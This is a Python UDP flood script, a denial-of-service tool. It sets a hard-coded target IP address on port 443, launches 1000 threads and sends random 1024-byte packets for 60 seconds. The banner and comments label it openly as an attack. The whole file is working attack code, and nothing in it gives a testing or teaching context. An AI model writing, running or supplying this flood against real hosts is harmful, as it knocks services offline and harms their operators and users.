import socket  
import random  
import threading  
import time  

# Target details  
target_ip = "206.212.246.58"  # Replace with target IP  
target_port = 443        # Replace with target port  

# Attack configuration  
packet_size = 1024              # Packet size in bytes  
threads = 1000                  # Number of threads for attack  
duration = 60                   # Attack duration in seconds  

def udp_flood(ip, port, packet_size, duration):  
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    packet = random._urandom(packet_size)  
    timeout = time.time() + duration  
    sent = 0  

    while time.time() < timeout:  
        try:  
            client.sendto(packet, (ip, port))  
            sent += 1  
        except Exception as e:  
            pass  

    print(f"Thread finished: Sent {sent} packets.")  

def start_attack():  
    print(f"Starting UDP flood attack on {target_ip}:{target_port}")  
    threads_list = []  

    for i in range(threads):  
        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, duration))  
        threads_list.append(thread)  
        thread.start()  

    for thread in threads_list:  
        thread.join()  

if __name__ == "__main__":  
    print("UDP Flood Script")  
    print("================")  
    print(f"Target: {target_ip}:{target_port}")  
    print(f"Threads: {threads}")  
    print(f"Packet size: {packet_size} bytes")  
    print(f"Duration: {duration} seconds\n")  

    start_attack()